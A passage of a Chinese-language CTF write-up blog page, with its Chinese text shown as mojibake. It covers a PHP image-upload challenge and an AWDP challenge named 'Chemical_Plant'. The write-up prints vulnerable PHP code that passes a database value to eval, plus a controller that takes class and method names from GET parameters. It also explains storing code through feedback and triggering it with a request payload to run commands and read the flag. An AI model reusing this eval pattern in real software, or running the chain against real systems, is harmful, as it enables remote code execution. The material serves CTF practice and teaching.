</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$allowed_extensions</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="nv">$upload_path</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$upload_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;ä¸Šä¼ æˆåŠŸï¼è·¯å¾„: &#34;</span> <span class="o">.</span> <span class="s1">&#39;uploads/&#39;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œè¯·é‡è¯•ã€‚&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;ä¸æ”¯æŒçš„æ–‡ä»¶ç±»å‹ï¼Œä»…æ”¯æŒ: &#34;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;, &#34;</span><span class="p">,</span> <span class="nv">$allowed_extensions</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="err">&lt;!DOCTYPE html&gt;
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="err">&lt;html lang=&#34;zh-CN&#34;&gt;
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="err">&lt;head&gt;
</span></span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="err">    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="err">    &lt;title&gt;å›¾ç‰‡ä¸Šä¼ ä¸ä¿¡æ¯è·å–&lt;/title&gt;
</span></span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="err">&lt;/head&gt;
</span></span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="err">&lt;body&gt;
</span></span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="err">&lt;h2&gt;å›¾ç‰‡ä¸Šä¼ &lt;/h2&gt;
</span></span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="err">&lt;form action=&#34;&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="err">    &lt;input type=&#34;file&#34; name=&#34;image&#34; required&gt;
</span></span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="err">    &lt;button type=&#34;submit&#34;&gt;ä¸Šä¼ å›¾ç‰‡&lt;/button&gt;
</span></span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="err">&lt;/form&gt;
</span></span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="err">&lt;h2&gt;è·å–å›¾ç‰‡ä¿¡æ¯&lt;/h2&gt;
</span></span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="err">&lt;form action=&#34;&#34; method=&#34;post&#34;&gt;
</span></span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="err">    &lt;label for=&#34;image_path&#34;&gt;è¯·è¾“å…¥å›¾ç‰‡è·¯å¾„ï¼š&lt;/label&gt;
</span></span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="err">    &lt;input type=&#34;text&#34; name=&#34;image_path&#34; required&gt;
</span></span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="err">    &lt;button type=&#34;submit&#34;&gt;è·å–å›¾ç‰‡ä¿¡æ¯&lt;/button&gt;
</span></span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="err">&lt;/form&gt;
</span></span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="err">&lt;/body&gt;
</span></span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="err">&lt;!--åªéœ€è¦ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è·å–åˆ°å…³é”®ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶åœ¨å“ªå„¿å‘¢--&gt;
</span></span></span></code></pre></div><p>ä»æºç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…³äºç…§ç‰‡çš„ä¿¡æ¯æŸ¥è¯¢ä½¿ç”¨çš„æ˜¯getimagesizeå‡½æ•°ï¼Œè€Œä¸”æ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤</p>
<p>è€Œgetimagesizeä¹Ÿæ˜¯å—filteré“¾å½±å“çš„å‡½æ•°ä¹‹ä¸€</p>
<p><img alt="image-20241229133401703" loading="lazy" src="../assets/image-20241229133401703.png"></p>
<h3 id="awdp">AWDP<a hidden class="anchor" aria-hidden="true" href="#awdp">#</a></h3>
<h4 id="chemical_plant">Chemical_Plant<a hidden class="anchor" aria-hidden="true" href="#chemical_plant">#</a></h4>
<h5 id="æ”»å‡»">æ”»å‡»<a hidden class="anchor" aria-hidden="true" href="#æ”»å‡»">#</a></h5>
<p>FeedbackService.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">class</span> <span class="nc">FeedbackService</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">private</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$dbConnection</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="nv">$dbConnection</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">addFeedbackByUserId</span><span class="p">(</span><span class="nv">$user_id</span><span class="p">,</span> <span class="nv">$feedback</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1">// é¢„å¤„ç†
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span>        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;INSERT INTO feedback (userid, feedback) VALUES (?, ?)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;ss&#34;</span><span class="p">,</span> <span class="nv">$user_id</span><span class="p">,</span> <span class="nv">$feedback</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1">// æ‰§è¡Œæ’å…¥æ“ä½œ
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getEmailById</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="c1">// é¢„å¤„ç†
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="c1"></span>        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT userid FROM feedback WHERE id = ?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">&#34;i&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="c1">// æ‰§è¡ŒæŸ¥æ‰¾æ“ä½œ
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">                <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">                <span class="nv">$arr</span> <span class="o">=</span> <span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;userid&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">                <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;$arr=&#39;</span><span class="o">.</span><span class="nv">$arr</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">                <span class="k">return</span> <span class="nv">$arr</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">                <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>åœ¨FeedbackService.phpçš„getEmailByIdæ–¹æ³•ä¸­çš„å­˜åœ¨evalï¼Œå‡å¦‚arrå¯æ§ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<p>é‚£æˆ‘ä»¬ç»§ç»­å¾€ä¸Šçœ‹</p>
<pre tabindex="0"><code>$arr = stripslashes($row[&#39;userid&#39;]);
</code></pre><p>å˜é‡arræ¥æºäºæ•°æ®åº“æŸ¥è¡¨idè¿”å›çš„ç»“æœä¸­çš„userid</p>
<p>å‡å¦‚è¯´æˆ‘ä»¬å¯ä»¥æå‰åœ¨useridä¸­å†™å…¥æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå†é€šè¿‡idæŸ¥è¯¢ï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤çš„æ‰§è¡Œ</p>
<p>å†™å…¥æ•°æ®åº“çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥åœ¨FeedbackService.phpçš„addFeedbackByUserIdæ–¹æ³•ä¸­æ‰¾åˆ°</p>
<pre tabindex="0"><code>public function addFeedbackByUserId($user_id, $feedback) {
        // é¢„å¤„ç†
        $stmt = $this-&gt;db-&gt;prepare(&#34;INSERT INTO feedback (userid, feedback) VALUES (?, ?)&#34;);
        $stmt-&gt;bind_param(&#34;ss&#34;, $user_id, $feedback);

        // æ‰§è¡Œæ’å…¥æ“ä½œ
        if ($stmt-&gt;execute()) {
            return true;
        } else {
            return false;
        }
    }
</code></pre><p>è¿™é‡Œé€šè¿‡è´«æ‹¼æ¥çš„æ–¹å¼å°†user_idæ‹¼æ¥åˆ°sqlè¯­å¥ä¸­å¹¶æ‰§è¡Œ</p>
<p>é‚£æˆ‘ä»¬æ¥ä¸‹å°±éœ€è¦æ‰¾åˆ°å“ªé‡Œè°ƒç”¨addFeedbackByUserIdæ–¹æ³•</p>
<p><img alt="image-20241221165851434" loading="lazy" src="../assets/image-20241221165851434.png"></p>
<p>åœ¨services.phpé‡Œè¿›è¡Œç”¨æˆ·åé¦ˆå†…å®¹æäº¤æ—¶ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤å°±è°ƒç”¨addFeedbackByUserIdæ–¹æ³•å†™å…¥</p>
<p>é‚£æˆ‘ä»¬æ‰§è¡Œä¸ªwhoamiè¯•è¯•</p>
<p><img alt="image-20241221170419746" loading="lazy" src="../assets/image-20241221170419746.png"></p>
<p>å‘½ä»¤ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™å‘¢</p>
<pre tabindex="0"><code>eval(&#39;$arr=&#39;.$arr.&#39;;&#39;);
</code></pre><p>å› ä¸ºå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™è¿›è¡Œäº†ç®€å•çš„æ‹¼æ¥</p>
<p>å†™å…¥æ•°æ®åæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦çœ‹çœ‹æ€æ ·è°ƒç”¨getEmailByIdæ–¹æ³•è¿›è¡Œæ•°æ®åº“idæŸ¥è¯¢</p>
<p>controller.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">// å¼•å…¥ç±»æ–‡ä»¶
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span><span class="k">require_once</span> <span class="s1">&#39;NewsService.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;FeedbackService.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">require_once</span><span class="s1">&#39;dbconnect.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;news_data.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DBConnect</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nv">$connection</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">getConnection</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nv">$NewsService</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NewsService</span><span class="p">(</span><span class="nv">$news_items</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$FeedbackService</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FeedbackService</span><span class="p">(</span><span class="nv">$connection</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$className</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$methodName</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;m&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;m&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$className</span> <span class="o">&amp;&amp;</span> <span class="nv">$methodName</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$className</span> <span class="o">===</span> <span class="s1">&#39;NewsService&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">method_exists</span><span class="p">(</span><span class="nv">$NewsService</span><span class="p">,</span> <span class="nv">$methodName</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nv">$NewsService</span><span class="o">-&gt;</span><span class="nv">$methodName</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$className</span> <span class="o">===</span> <span class="s1">&#39;FeedbackService&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">method_exists</span><span class="p">(</span><span class="nv">$FeedbackService</span><span class="p">,</span> <span class="nv">$methodName</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nv">$FeedbackService</span><span class="o">-&gt;</span><span class="nv">$methodName</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;æ— æ•ˆçš„ç±»æˆ–æ–¹æ³•&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;ç¼ºå°‘ç±»æˆ–æ–¹æ³•å‚æ•°&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>åœ¨controller.phpé‡Œé¢å¯ä»¥é€šè°ƒç”¨FeedbackService.phpå’ŒNewsService.phpä¸­çš„æ–¹æ³•</p>
<pre tabindex="0"><code>$className = isset($_GET[&#39;c&#39;]) ? $_GET[&#39;c&#39;] : null;
$methodName = isset($_GET[&#39;m&#39;]) ? $_GET[&#39;m&#39;] : null;
$id = isset($_GET[&#39;id&#39;]) ? $_GET[&#39;id&#39;] : null;
</code></pre><p>é€šè¿‡getä¼ å‚å³å¯è°ƒç”¨getEmailByIdæ–¹æ³•</p>
<p>payload:</p>
<pre tabindex="0"><code>c=FeedbackService&amp;m=getEmailById&amp;id=0
</code></pre><p>è¿™ä¸ªidæˆ‘ä»¬å…¶å®å¹¶ä¸æ¸…æ¥šï¼Œå¯ä»¥çˆ†ç ´æˆ–è€…ä¸€ä¸ªä¸ªè¯•è¯•ï¼Œåæ­£ä¸å¤š</p>
<p><img alt="image-20241221172130196" loading="lazy" src="../assets/image-20241221172130196.png"></p>
<p>å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œæ¥ä¸‹æ¥åªéœ€è¦è¯»flagå°±è¡Œäº†</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>CTFSHOW-SQLæ³¨å…¥-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>CTFSHOW-ååºåˆ—åŒ–-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">Â©2024 Xrntkk&rsquo;s Blog</a></span> Â· 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
